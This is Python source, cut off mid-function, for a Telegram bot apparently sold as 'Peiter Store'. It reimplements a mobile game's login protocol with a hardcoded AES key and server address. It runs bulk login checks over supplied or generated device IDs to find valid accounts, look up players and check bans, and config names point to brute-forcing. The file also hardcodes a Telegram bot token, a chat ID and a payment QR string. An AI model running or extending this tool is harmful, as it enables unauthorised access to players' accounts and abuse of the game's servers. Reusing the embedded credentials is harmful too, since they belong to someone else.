#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PEITER STORE — ULTIMATE v10 FINAL
Optimized + Live Progress + All Fix + Auto Naming
"""

import os, sys, time, json, random, secrets, hashlib, threading, re, csv
import shutil, zipfile, socket, zlib, struct, subprocess, platform
import concurrent.futures
import urllib.request, urllib.parse, itertools
import uuid
from pathlib import Path
from datetime import datetime, timezone, timedelta
from enum import Enum
from typing import Any, Tuple, Dict, List, Optional
from collections import deque

print("[BOOT] Peiter Ultimate starting...")

_MISSING = []
for pkg, pip_name in [("requests","requests"),("zstandard","zstandard"),("Crypto","pycryptodome")]:
    try: __import__(pkg)
    except ImportError: _MISSING.append(pip_name)
if _MISSING:
    print(f"[FATAL] pip install {' '.join(_MISSING)}")
    sys.exit(1)

import requests
import zstandard as zstd
from Crypto.Cipher import AES
print("[BOOT] Deps OK")

try:
    import license_manager as lics
    print("[BOOT] License OK")
except Exception as e:
    lics = None
    print(f"[BOOT] License OFF: {e}")

try:
    import extras as ex
    print("[BOOT] Extras OK")
except Exception as e:
    ex = None
    print(f"[BOOT] Extras OFF: {e}")

try:
    import donate as dn
    print("[BOOT] Donate OK")
except Exception as e:
    dn = None
    print(f"[BOOT] Donate OFF: {e}")

try:
    import output_namer as on
    print("[BOOT] OutputNamer OK")
except Exception as e:
    on = None
    print(f"[BOOT] OutputNamer OFF: {e}")

try:
    from started_tracker import StartedTracker, broadcast_to_started
    print("[BOOT] StartedTracker OK")
except Exception as e:
    StartedTracker = None
    broadcast_to_started = None
    print(f"[BOOT] StartedTracker OFF: {e}")
try:
    from tac_pool_extended import TAC_POOL_ALL, TAC_POOL_ANDROID, TAC_POOL_IOS
    print(f"[BOOT] TAC Pool OK ({len(TAC_POOL_ALL)} TAC)")
except Exception as e:
    TAC_POOL_ALL = TAC_POOL_ANDROID = TAC_POOL_IOS = None
    print(f"[BOOT] TAC Pool OFF: {e}")

# ══════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════
BOT_TOKEN     = os.environ.get("TG_BOT_TOKEN", "").strip()
CHAT_ID       = os.environ.get("TG_CHAT_ID", "").strip()
OWNER_CHAT_ID = os.environ.get("TG_OWNER_CHAT_ID", CHAT_ID).strip()

if not BOT_TOKEN:
    BOT_TOKEN = "8994834374:AAE3R_SDn3zesGqXeLqZ5DpffNz_1nAxsj4"
if not CHAT_ID:
    CHAT_ID = "7466514034"
if not OWNER_CHAT_ID:
    OWNER_CHAT_ID = CHAT_ID

if not BOT_TOKEN or not OWNER_CHAT_ID:
    print("[FATAL] Set TG_BOT_TOKEN dan TG_OWNER_CHAT_ID")
    sys.exit(1)

PERFORMANCE_MODE = os.environ.get("PEITER_MODE", "balanced")

PERF_PROFILES = {
    "aggressive": {"ban_w":120,"valid_w":150,"detail_w":120,"lookup_w":100,"rate":0.003},
    "balanced":   {"ban_w":60,"valid_w":80,"detail_w":60,"lookup_w":60,"rate":0.010},
    "safe":       {"ban_w":30,"valid_w":40,"detail_w":30,"lookup_w":30,"rate":0.030},
}
PROFILE = PERF_PROFILES.get(PERFORMANCE_MODE, PERF_PROFILES["balanced"])

DEFAULT_LIMIT_LOOKUP = 10
DEFAULT_LIMIT_VALID  = 10
DEFAULT_LIMIT_BULK   = 5
BF_GEN_MAX        = 10000
BF_KICK_MAX_LOOPS = 100
BF_KICK_DELAY     = 0.5
ANTI_FLOOD_MAX    = 12
ANTI_FLOOD_WINDOW = 60
FORWARD_DELAY_MIN = 5.0
FORWARD_DELAY_MAX = 15.0

AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV  = b'\x00' * 16
SERVER_HOST    = 'login.ml.youngjoygame.com'
SERVER_PORT    = 30021
CLIENT_VERSION = '2.1.99.1205.1'
CHANNEL        = 'and_usa'
LANGUAGE       = 'en'

BASE_DIR     = Path(__file__).resolve().parent
STORE_DIR    = BASE_DIR / "peiter_store"
UPLOAD_DIR   = STORE_DIR / "uploads"
RESULTS_DIR  = STORE_DIR / "results"
BAN_DIR      = STORE_DIR / "ban"
SPLIT_DIR    = STORE_DIR / "split"
LOGS_DIR     = STORE_DIR / "logs"
BRUTE_DIR    = STORE_DIR / "bruteforce"
FORENSIC_DIR = Path.home() / ".cache" / "peiter_forensic"

for d in (STORE_DIR, UPLOAD_DIR, RESULTS_DIR, BAN_DIR, SPLIT_DIR,
          LOGS_DIR, BRUTE_DIR, FORENSIC_DIR):
    d.mkdir(parents=True, exist_ok=True)

FORENSIC_FILE = FORENSIC_DIR / "forward.log"
RESULTS_FILE  = RESULTS_DIR / "valid.txt"
try:
    TZ_WIB
except NameError:
    TZ_WIB = timezone(timedelta(hours=7))

if StartedTracker:
    STARTED_TRACKER = StartedTracker(STORE_DIR / "started_users.json")
else:
    STARTED_TRACKER = None

if ex:
    NOTIF_STORE = ex.NotifStore(STORE_DIR / "notif.json")
    UNAME_STORE = ex.UsernameStore(STORE_DIR / "usernames.json")
    JOB_TRACKER = ex.JobTracker()
    PAGINATOR   = ex.Paginator()
    CONFIRMER   = ex.Confirmer()
    AUDIT_LOG   = ex.AuditLog(LOGS_DIR / "audit.log")
    FWD_QUEUE   = ex.ForwardQueue()
else:
    NOTIF_STORE = UNAME_STORE = JOB_TRACKER = None
    PAGINATOR = CONFIRMER = AUDIT_LOG = FWD_QUEUE = None

if dn:
    QRIS_CFG = dn.QRISConfig(STORE_DIR / "qris.json")
    if not QRIS_CFG.get("qris_static"):
        QRIS_CFG.set("qris_static",
            "00020101021126570011ID.DANA.WWW011893600915394696514402099469651440303UMI51440014ID.CO.QRIS.WWW0215ID10254172619100303UMI5204594553033605802ID5911PeiterStore6011Kota Bekasi61051741263041D7E")
    DONATION_TRACKER = dn.DonationTracker(STORE_DIR / "donations.json")
else:
    QRIS_CFG = DONATION_TRACKER = None

# ══════════════════════════════════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════════════════════════════════
_BLOCKED_USERS    = set()
_USER_ACCESS      = {}
_USER_ACCESS_LOCK = threading.Lock()
_USER_LIMITS      = {}
_USER_LIMITS_LOCK = threading.Lock()
_USER_FLOOD       = {}
_USER_FLOOD_LOCK  = threading.Lock()
_USER_PENDING     = {}
_USER_PENDING_LOCK= threading.Lock()
_ACTIVE_JOBS      = {}
_ACTIVE_JOBS_LOCK = threading.Lock()
_FWD_CACHE        = set()
_FWD_LOCK         = threading.Lock()
_ALIAS_CACHE      = {}
_ALIAS_LOCK       = threading.Lock()
_RATE_LOCK        = threading.Lock()
_LAST_REQ         = [0.0]
_BOT_START_TIME   = time.time()
_BOT_STOP         = threading.Event()
_BOT_LAST_UPDATE  = 0
_RATE_LOCAL       = threading.local()

# ══════════════════════════════════════════════════════════════════
#  UTILS
# ══════════════════════════════════════════════════════════════════
def now_wib(): return datetime.now(TZ_WIB)
def today_str(): return now_wib().strftime("%Y-%m-%d")
def safe_print(*a, **k):
    try: print(*a, **k, flush=True)
    except: pass

def hash_id(val, salt="peiter"):
    return hashlib.sha256(f"{salt}:{val}".encode()).hexdigest()[:10]

def get_alias(cid):
    cid = str(cid)
    with _ALIAS_LOCK:
        if cid not in _ALIAS_CACHE:
            _ALIAS_CACHE[cid] = "USR-" + hash_id(cid).upper()
        return _ALIAS_CACHE[cid]

def random_delay(): return random.uniform(FORWARD_DELAY_MIN, FORWARD_DELAY_MAX)

def rate_wait():
    if ex:
        ex.rate_wait_local(PROFILE["rate"])
    else:
        if not hasattr(_RATE_LOCAL, "last"):
            _RATE_LOCAL.last = 0.0
        now = time.time()
        wait = PROFILE["rate"] - (now - _RATE_LOCAL.last)
        if wait > 0:
            time.sleep(wait)
        _RATE_LOCAL.last = time.time()

def log_forensic(entry: dict):
    try:
        entry["ts"] = now_wib().isoformat()
        with open(FORENSIC_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
    except: pass

def log_activity(cid, username, action, detail=""):
    if AUDIT_LOG:
        AUDIT_LOG.log(cid, username, action, detail)
    else:
        try:
            ts = now_wib().strftime("%Y-%m-%d %H:%M:%S")
            line = f"[{ts}] [{cid}] [{username}] {action}"
            if detail: line += f" | {detail}"
            with open(LOGS_DIR / "activity.log", "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except: pass

def progress_bar(done, total, width=20):
    if total <= 0: return "░" * width + " 0%"
    pct = min(100, int(done / total * 100))
    filled = int(width * pct / 100)
    return f"{'█'*filled}{'░'*(width-filled)} {pct}% ({done}/{total})"

# ══════════════════════════════════════════════════════════════════
#  OPTIMASI SPEED
# ══════════════════════════════════════════════════════════════════
import queue as _queue

_DEVICE_CACHE = {"data": [], "ts": 0, "lock": threading.Lock()}

def get_cached_device_ids(max_age=60):
    with _DEVICE_CACHE["lock"]:
        if time.time() - _DEVICE_CACHE["ts"] < max_age and _DEVICE_CACHE["data"]:
            return _DEVICE_CACHE["data"]
    ids = _load_device_ids()
    with _DEVICE_CACHE["lock"]:
        _DEVICE_CACHE["data"] = ids
        _DEVICE_CACHE["ts"] = time.time()
    return ids


class AdaptiveRate:
    def __init__(self, base_rate=0.01, min_rate=0.003, max_rate=0.1):
        self.current = base_rate
        self.min = min_rate
        self.max = max_rate
        self.lock = threading.Lock()
        self.success_count = 0
        self.fail_count = 0

    def wait(self):
        with self.lock:
            rate = self.current
        if rate > 0:
            time.sleep(rate)

    def report(self, success):
        with self.lock:
            if success:
                self.success_count += 1
                self.fail_count = 0
                if self.success_count >= 10:
                    self.current = max(self.min, self.current * 0.9)
                    self.success_count = 0
            else:
                self.fail_count += 1
                self.success_count = 0
                if self.fail_count >= 5:
                    self.current = min(self.max, self.current * 1.2)
                    self.fail_count = 0


_ADAPTIVE_RATE = AdaptiveRate()


class LiveProgress:
    def __init__(self, cid, message_id=None, title="Processing", interval=3.0):
        self.cid = cid
        self.message_id = message_id
        self.title = title
        self.interval = interval
        self.total = 0
        self.done = 0
        self.valid = 0
        self.failed = 0
        self.start_time = time.time()
        self.stop_flag = threading.Event()
        self.lock = threading.Lock()
        self._loop_started = False

    def start(self, total):
        self.total = total
        self.start_time = time.time()
        self.stop_flag.clear()
        try:
            r = tg_api("sendMessage",
                       chat_id=self.cid,
                       text=self._render(),
                       parse_mode="HTML")
            if r.get("ok"):
                self.message_id = r["result"]["message_id"]
            else:
                tg_send(self.cid, self._render())
        except:
            tg_send(self.cid, self._render())
        self._loop_started = True
        threading.Thread(target=self._loop, daemon=True).start()

    def update(self, done=None, valid=None, failed=None):
        with self.lock:
            if done is not None: self.done = done
            if valid is not None: self.valid = valid
            if failed is not None: self.failed = failed

    def finish(self):
        self.stop_flag.set()

    def _render(self):
        elapsed = time.time() - self.start_time
        bar = progress_bar(self.done, self.total)
        eta = ""
        speed = ""
        if self.done > 0 and self.total > 0:
            eta_sec = (elapsed / self.done) * (self.total - self.done)
            eta = f"\n⏱ ETA: <b>{int(eta_sec)}s</b>"
            speed = f"\n⚡ Speed: <b>{self.done/elapsed:.1f}/s</b>"
        return (
            f"📁 <b>{self.title}</b>\n"
            f"📊 Total: <b>{self.total}</b>\n\n"
            f"⏳ Processing...\n"
            f"<code>{bar}</code>\n"
            f"✅ Valid: <b>{self.valid}</b>\n"
            f"❌ Failed: <b>{self.failed}</b>{eta}{speed}"
        )

    def _loop(self):
        while not self.stop_flag.is_set():
            time.sleep(self.interval)
            if self.stop_flag.is_set(): break
            try:
                text = self._render()
                if self.message_id:
                    tg_edit(self.cid, self.message_id, text)
            except Exception as e:
                safe_print(f"[LIVE ERR] {e}")


def progress_worker_live(cid, ids, check_func, title="Processing", workers=80):
    total = len(ids)
    prog = LiveProgress(cid, title=title)
    prog.start(total)

    results = []
    lock = threading.Lock()
    done = [0]

    def _w(did):
        try:
            _ADAPTIVE_RATE.wait()
            r = check_func(did)
            ok = bool(r)
            _ADAPTIVE_RATE.report(ok)
            with lock:
                if ok:
                    results.append(r)
                done[0] += 1
                prog.update(done=done[0],
                            valid=len(results),
                            failed=done[0] - len(results))
        except:
            _ADAPTIVE_RATE.report(False)
            with lock:
                done[0] += 1
                prog.update(done=done[0],
                            valid=len(results),
                            failed=done[0] - len(results))

    chunk_size = max(1, total // workers)
    chunks = [ids[i:i+chunk_size] for i in range(0, total, chunk_size)]

    def _do_chunk(chunk):
        for did in chunk:
            _w(did)

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex_:
        list(ex_.map(_do_chunk, chunks))

    prog.finish()
    time.sleep(0.5)
    return results, prog


print("[BOOT] Optimizations loaded")
print("[BOOT] Bagian 1/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  STATE MANAGEMENT
# ══════════════════════════════════════════════════════════════════
def load_state():
    global _BLOCKED_USERS, _USER_ACCESS, _USER_LIMITS
    try:
        p = STORE_DIR / "blocked.json"
        if p.exists(): _BLOCKED_USERS = set(json.loads(p.read_text()).get("blocked", []))
    except: pass
    try:
        p = STORE_DIR / "access.json"
        if p.exists(): _USER_ACCESS = json.loads(p.read_text()).get("users", {})
    except: pass
    try:
        p = STORE_DIR / "limits.json"
        if p.exists(): _USER_LIMITS = json.loads(p.read_text()).get("limits", {})
    except: pass

def save_blocked():
    try:
        (STORE_DIR / "blocked.json").write_text(
            json.dumps({"blocked": list(_BLOCKED_USERS)}, indent=2), encoding="utf-8")
    except: pass

def save_access():
    try:
        (STORE_DIR / "access.json").write_text(
            json.dumps({"users": _USER_ACCESS}, indent=2), encoding="utf-8")
    except: pass

def save_limits():
    try:
        (STORE_DIR / "limits.json").write_text(
            json.dumps({"limits": _USER_LIMITS}, indent=2), encoding="utf-8")
    except: pass

def get_role(cid):
    cid = str(cid)
    if cid in _BLOCKED_USERS: return None
    if cid == str(OWNER_CHAT_ID): return "owner"
    with _USER_ACCESS_LOCK:
        info = _USER_ACCESS.get(cid)
        if not info: return "user"
        exp = info.get("expires")
        if exp and time.time() > exp: return "guest"
        return info.get("role", "user")

def is_admin(cid): return get_role(cid) in ("owner", "admin")
def is_owner(cid): return get_role(cid) == "owner"

def grant_access(cid, role="user", granted_by="manual"):
    cid = str(cid)
    with _USER_ACCESS_LOCK:
        _USER_ACCESS[cid] = {"role": role, "granted": time.time(),
                             "granted_by": granted_by, "expires": None}
    save_access()

def revoke_access(cid):
    cid = str(cid)
    with _USER_ACCESS_LOCK:
        _USER_ACCESS.pop(cid, None)
    save_access()

def limit_entry(cid):
    cid = str(cid); today = today_str()
    with _USER_LIMITS_LOCK:
        e = _USER_LIMITS.get(cid, {})
        if e.get("date") != today:
            e = {"date": today, "lookup": 0, "valid": 0, "bulk": 0,
                 "custom_lookup": e.get("custom_lookup", DEFAULT_LIMIT_LOOKUP),
                 "custom_valid":  e.get("custom_valid",  DEFAULT_LIMIT_VALID),
                 "custom_bulk":   e.get("custom_bulk",   DEFAULT_LIMIT_BULK)}
            _USER_LIMITS[cid] = e
    save_limits()
    return e.copy()

def check_limit(cid, kind):
    if is_admin(cid): return True, 0, 999999
    e = limit_entry(cid)
    mx = e.get(f"custom_{kind}", {"lookup":10,"valid":10,"bulk":5}.get(kind, 5))
    used = e.get(kind, 0)
    return used < mx, used, mx

def inc_limit(cid, kind, amt=1):
    cid = str(cid); today = today_str()
    with _USER_LIMITS_LOCK:
        e = _USER_LIMITS.get(cid, {})
        if e.get("date") != today:
            e = {"date": today, "lookup": 0, "valid": 0, "bulk": 0}
        e[kind] = e.get(kind, 0) + amt
        _USER_LIMITS[cid] = e
    save_limits()

def set_limit(cid, kind, val):
    cid = str(cid)
    e = limit_entry(cid)
    e[f"custom_{kind}"] = int(val)
    with _USER_LIMITS_LOCK:
        _USER_LIMITS[cid] = e
    save_limits()

def reset_limit(cid):
    cid = str(cid)
    with _USER_LIMITS_LOCK:
        if cid in _USER_LIMITS:
            e = _USER_LIMITS[cid]
            e["lookup"] = 0; e["valid"] = 0; e["bulk"] = 0
    save_limits()

def check_flood(cid):
    cid = str(cid); now = time.time()
    with _USER_FLOOD_LOCK:
        ts = _USER_FLOOD.get(cid, [])
        ts = [t for t in ts if now - t < ANTI_FLOOD_WINDOW]
        ts.append(now)
        _USER_FLOOD[cid] = ts
        return len(ts) > ANTI_FLOOD_MAX, len(ts)

def set_pending(cid, state, data=None):
    with _USER_PENDING_LOCK:
        _USER_PENDING[str(cid)] = {"state": state, "data": data or {}, "ts": time.time()}

def get_pending(cid):
    with _USER_PENDING_LOCK:
        item = _USER_PENDING.get(str(cid))
        if not item: return None
        if time.time() - item.get("ts", 0) > 600:
            _USER_PENDING.pop(str(cid), None); return None
        return item

def clear_pending(cid):
    with _USER_PENDING_LOCK:
        _USER_PENDING.pop(str(cid), None)

def job_start(cid, name, total=0):
    with _ACTIVE_JOBS_LOCK:
        _ACTIVE_JOBS[str(cid)] = {"name": name, "total": total, "done": 0,
                                   "stop": False, "start": time.time()}

def job_update(cid, done=None, total=None):
    with _ACTIVE_JOBS_LOCK:
        j = _ACTIVE_JOBS.get(str(cid))
        if not j: return
        if done is not None: j["done"] = done
        if total is not None: j["total"] = total

def job_stop(cid):
    with _ACTIVE_JOBS_LOCK:
        j = _ACTIVE_JOBS.get(str(cid))
        if j:
            j["stop"] = True
            return True
    return False

def job_check(cid):
    with _ACTIVE_JOBS_LOCK:
        j = _ACTIVE_JOBS.get(str(cid))
        return bool(j and j.get("stop"))

def job_get(cid):
    with _ACTIVE_JOBS_LOCK:
        return dict(_ACTIVE_JOBS.get(str(cid), {}))

def job_end(cid):
    with _ACTIVE_JOBS_LOCK:
        _ACTIVE_JOBS.pop(str(cid), None)

def stop_job(cid):
    if JOB_TRACKER and JOB_TRACKER.stop(cid):
        return True
    return job_stop(cid)

print("[BOOT] Bagian 2/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  SDP PROTOCOL
# ══════════════════════════════════════════════════════════════════
class SdpType(Enum):
    INT_POS=0; INT_NEG=1; FLOAT=2; DOUBLE=3; STRING=4
    LIST=5; DICT=6; STRUCT_BEGIN=7; STRUCT_END=8

class SdpStruct(dict):
    def __init__(self, data=None):
        super().__init__()
        self.data = b''; self.offset = 0
        if isinstance(data, bytes):
            self.data = data; self._unpack()
        elif data is not None:
            self.update(data); self._pack()

    def _pack(self):
        self.data = bytes([SdpType.STRUCT_BEGIN.value << 4])
        for k, v in sorted(self.items()): self._pack_one(k, v)
        self.data += bytes([SdpType.STRUCT_END.value << 4])

    def _unpack(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpType.STRUCT_BEGIN.value: self.offset = 1
        while self.offset < len(self.data):
            k, v = self._unpack_one()
            if isinstance(v, SdpType) and v == SdpType.STRUCT_END: break
            self[k] = v

    def _w_num(self, n):
        r = bytearray()
        while n >= 0x80:
            r.append((n & 0x7F) | 0x80); n >>= 7
        r.append(n & 0x7F); return bytes(r)

    def _r_num(self):
        n = 1; v = self.data[self.offset] & 0x7F
        while self.offset + n - 1 < len(self.data) and self.data[self.offset + n - 1] >= 0x80:
            if self.offset + n >= len(self.data): break
            v |= (self.data[self.offset + n] & 0x7F) << (7 * n); n += 1
        self.offset += n; return v

    def _pack_one(self, tag, val):
        if isinstance(val, bool):
            self.data += bytes([(SdpType.INT_POS.value << 4) | tag]) + self._w_num(1 if val else 0)
        elif isinstance(val, int):
            if val < 0:
                self.data += bytes([(SdpType.INT_NEG.value << 4) | tag]) + self._w_num(-val)
            else:
                self.data += bytes([(SdpType.INT_POS.value << 4) | tag]) + self._w_num(val)
        elif isinstance(val, float):
            self.data += bytes([(SdpType.DOUBLE.value << 4) | tag]) + self._w_num(8) + struct.pack("<d", val)
        elif isinstance(val, (str, bytes)):
            enc = val.encode() if isinstance(val, str) else val
            self.data += bytes([(SdpType.STRING.value << 4) | tag]) + self._w_num(len(enc)) + enc
        elif isinstance(val, list):
            self.data += bytes([(SdpType.LIST.value << 4) | tag]) + self._w_num(len(val))
            for it in val: self._pack_one(0, it)
        elif isinstance(val, dict):
            if isinstance(val, SdpStruct):
                self.data += bytes([(SdpType.STRUCT_BEGIN.value << 4) | tag])
                for k, v in sorted(val.items()): self._pack_one(k, v)
                self.data += bytes([SdpType.STRUCT_END.value << 4])
            else:
                self.data += bytes([(SdpType.DICT.value << 4) | tag]) + self._w_num(len(val))
                for k, v in sorted(val.items()):
                    self._pack_one(0, k); self._pack_one(0, v)

    def _unpack_one(self):
        if self.offset >= len(self.data): return 0, None
        h = self.data[self.offset]; tag = h & 0xF; dt = SdpType(h >> 4); self.offset += 1
        if tag == 15: tag = self._r_num()
        if dt == SdpType.INT_POS: return tag, self._r_num()
        if dt == SdpType.INT_NEG: return tag, -self._r_num()
        if dt == SdpType.FLOAT:
            n = self._r_num()
            v = self.data[self.offset:self.offset+n].ljust(4, b'\x00')
            self.offset += n; return tag, struct.unpack("<f", v)[0]
        if dt == SdpType.DOUBLE:
            n = self._r_num()
            v = self.data[self.offset:self.offset+n].ljust(8, b'\x00')
            self.offset += n; return tag, struct.unpack("<d", v)[0]
        if dt == SdpType.STRING:
            ln = self._r_num()
            try: v = self.data[self.offset:self.offset+ln].decode('utf-8')
            except: v = self.data[self.offset:self.offset+ln]
            self.offset += ln; return tag, v
        if dt == SdpType.LIST:
            ln = self._r_num()
            return tag, [self._unpack_one()[1] for _ in range(ln)]
        if dt == SdpType.DICT:
            ln = self._r_num(); v = {}
            for _ in range(ln):
                _, k = self._unpack_one(); _, val = self._unpack_one(); v[k] = val
            return tag, v
        if dt == SdpType.STRUCT_BEGIN:
            d = {}
            while True:
                st, sv = self._unpack_one()
                if isinstance(sv, SdpType) and sv == SdpType.STRUCT_END: break
                d[st] = sv
            return tag, SdpStruct(d)
        if dt == SdpType.STRUCT_END: return tag, SdpType.STRUCT_END
        return tag, None

class BaseConn:
    def __init__(self, host, port):
        self.host = host; self.port = port
        self.sequence = 1; self.socket = None
    def __enter__(self): return self
    def __exit__(self, *a): self.cleanup(); return False
    def connect(self, host=None, port=None):
        if host: self.host = host
        if port: self.port = port
        self.sequence = 1
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(6)
        self.socket.connect((self.host, self.port))
        self.socket.settimeout(6)
    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except: pass
            self.sequence = 1; self.socket = None
    def send_data(self, pkt_id, sdp):
        pkt = SdpStruct({0: pkt_id, 1: self.sequence, 5: sdp.data}).data
        buf = zstd.compress(pkt)
        flags = (len(buf) + 4) | (16 << 24)
        self.socket.sendall(flags.to_bytes(4, 'big') + buf)
        self.sequence += 1
    def recv_data(self):
        try:
            q = b''
            while len(q) < 4:
                d = self.socket.recv(4096)
                if not d: return None, None
                q += d
            flags = int.from_bytes(q[:4], 'big')
            size = flags & 0xFFFFFF; ctype = flags >> 24
            if size < 4 or size > 10_000_000: return None, None
            while len(q) < size:
                d = self.socket.recv(4096)
                if not d: return None, None
                q += d
            data = q[4:size]
            if ctype == 1: data = zlib.decompress(data)
            elif ctype == 16: data = zstd.decompress(data)
            elif ctype in (2, 3, 18):
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
                data = cipher.decrypt(data[:-1] if len(data) % 16 else data).rstrip(b'\x00')
                if ctype == 3: data = zlib.decompress(data)
                elif ctype == 18: data = zstd.decompress(data)
            res = SdpStruct(data); pid = res.get(0)
            if pid is None: return None, None
            body = res.get(6) or res.get(5)
            return pid, SdpStruct(body) if body and isinstance(body, bytes) else None
        except socket.timeout: return -1, None
        except Exception: return None, None

class GameLogin(BaseConn):
    def __init__(self, device_id):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei_md5       = raw[:32] if len(raw) >= 32 else raw
        self.android_id     = raw[32:48] if len(raw) >= 48 else ""
        self.advertising_id = raw[48:] if len(raw) > 48 else ""
        self.channel = CHANNEL
        self.client_version = CLIENT_VERSION
    def run(self):
        try:
            self.connect()
            self.send_data(1, SdpStruct({
                0: self.device_id,
                1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
                2: self.client_version, 3: self.channel, 4: LANGUAGE,
            }))
            pid, res = self.recv_data()
            if pid == 2 and res:
                return res.get(0), (res[2][0] if 2 in res else None)
            return None, None
        except Exception: return None, None
        finally: self.cleanup()

print("[BOOT] Bagian 3/10 selesai")

class GameConnection(BaseConn):
    def __init__(self, device_id):
        super().__init__(SERVER_HOST, SERVER_PORT)
        self.device_id = device_id
        raw = device_id.strip()
        if raw.startswith(("and_", "ios_")): raw = raw[4:]
        self.imei_md5       = raw[:32] if len(raw) >= 32 else raw
        self.android_id     = raw[32:48] if len(raw) >= 48 else ""
        self.advertising_id = raw[48:] if len(raw) > 48 else ""
        self.channel = CHANNEL
        self.client_version = CLIENT_VERSION
        self.account_id = 0; self.session_key = ''; self.zone_id = 0
        self.game_server_host = ''; self.game_server_port = 0
        self.creation_ts = 0

    def login_to_login_server(self):
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version, 3: self.channel, 4: LANGUAGE,
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id  = res.get(0)
            self.session_key = res.get(1)
            zd = res.get(2)
            if isinstance(zd, list) and zd:
                self.zone_id = zd[0] if not isinstance(zd[0], dict) else zd[0].get(0, 0)
            elif isinstance(zd, dict): self.zone_id = zd.get(0, 0)
            else: self.zone_id = zd or 0
            self.creation_ts = res.get(19, 0)
            return True
        return False

    def get_game_server(self):
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key, 2: self.client_version,
            5: self.zone_id, 6: self.channel,
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            gs = res[1]
            self.game_server_host, self.game_server_port = gs.split(':')
            self.game_server_port = int(self.game_server_port)
            return True
        return False

    def connect_to_game_server(self):
        try:
            self.connect()
            if not self.login_to_login_server(): return False
            if not self.get_game_server(): return False
            self.cleanup()
            self.host = self.game_server_host
            self.port = self.game_server_port
            self.connect()
            self.send_data(10001, SdpStruct({
                0: self.account_id, 1: self.session_key, 2: self.zone_id,
                4: self.client_version, 13: self.channel, 15: self.device_id,
            }))
            self.send_data(10101, SdpStruct({0: 0, 2: 2}))
            while True:
                pid, res = self.recv_data()
                if pid is None: return False
                if pid == 10002: return True
                if pid == -1: return False
        except Exception:
            return False

    def lookup_player(self, search_value):
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        while True:
            pid, res = self.recv_data()
            if pid is None or pid == -1: return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 2: return None

    def get_skin_role_info(self, role_id, zone_id, retries=3):
        for _ in range(retries):
            try:
                self.send_data(10143, SdpStruct({0: int(role_id), 1: int(zone_id)}))
                tc = 0
                while tc < 3:
                    pid, res = self.recv_data()
                    if pid is None: break
                    elif pid == -1: tc += 1
                    elif pid == 10144: return res
            except: pass
        return None

    def get_v2l_status(self, role_id, zone_id):
        try:
            self.send_data(10208, SdpStruct({0: int(role_id), 1: int(zone_id)}))
            tc = 0
            while tc < 3:
                pid, res = self.recv_data()
                if pid in (-1, None): break
                if pid == 10208 and res:
                    data = dict(res)
                    for t in (10, 11, 13, 14, 15, 0, 2, 3, 5):
                        v = data.get(t)
                        if v is None: continue
                        try: return "Enabled" if int(v) > 0 else "Disabled"
                        except: pass
        except: pass
        return "N/A"

print("[BOOT] Bagian 4/10 selesai")

# ══════════════════════════════════════════════════════════════════
#  BAN CHECK
# ══════════════════════════════════════════════════════════════════
BAN_REASON_MAP = {
    "21":"Cheats","22":"Mods","23":"Automation","24":"Bug Exploit",
    "25":"Plugins","26":"Bots","27":"Matchmaking","28":"Losing",
    "29":"AFK","30":"Harassment","31":"Hate Speech","32":"Threats",
    "33":"Impersonation","34":"Scam","35":"Phishing","36":"Links",
    "37":"Username","38":"Profile","39":"Sharing","40":"Payment",
    "41":"Chargeback","42":"Refund","43":"Evading","44":"Security",
    "45":"ToS","46":"Conduct","47":"Fair Play","48":"GameSec",
    "49":"Recovery",
}

def parse_ban_20001(res):
    if not res: return None
    info = {}; reason_code = None
    day = hour = minute = sec = None
    stack = [dict(res)]
    while stack:
        obj = stack.pop()
        if isinstance(obj, dict):
            for k, v in obj.items():
                kl = str(k).lower() if isinstance(k, str) else str(k)
                if kl == 'ban_reason': reason_code = str(v)
                elif kl == 'endtime_day': day = str(v)
                elif kl == 'endtime_hour': hour = str(v)
                elif kl == 'endtime_min': minute = str(v)
                elif kl == 'endtime_sec': sec = str(v)
                if isinstance(v, (dict, list)): stack.append(v)
        elif isinstance(obj, list):
            for it in obj:
                if isinstance(it, (dict, list)): stack.append(it)
    if reason_code is not None or day is not None:
        info['ban_reason'] = reason_code or '?'
        info['reason_name'] = BAN_REASON_MAP.get(reason_code, f"Code {reason_code}")
        if day: info['endtime_day'] = day
        if hour: info['endtime_hour'] = hour
        if minute: info['endtime_min'] = minute
        if sec: info['endtime_sec'] = sec
        return info
    return None

def check_device_ban_strict(device_id):
    rate_wait()
    conn = GameConnection(device_id)
    try:
        try: conn.connect(SERVER_HOST, SERVER_PORT)
        except: return "UNKNOWN", f"{device_id} | CONN_FAIL", True
        try:
            conn.send_data(1, SdpStruct({
                0: conn.device_id,
                1: f'gps_adid={conn.advertising_id}&android_id={conn.android_id}&device_unique_id={conn.imei_md5}',
                2: conn.client_version, 3: conn.channel, 4: 'en',
            }))
        except: return "UNKNOWN", f"{device_id} | SEND_FAIL", True
        pid, res = conn.recv_data()
        if pid == -1: return "UNKNOWN", f"{device_id} | TIMEOUT", True
        if pid is None: return "UNKNOWN", f"{device_id} | CLOSED", True
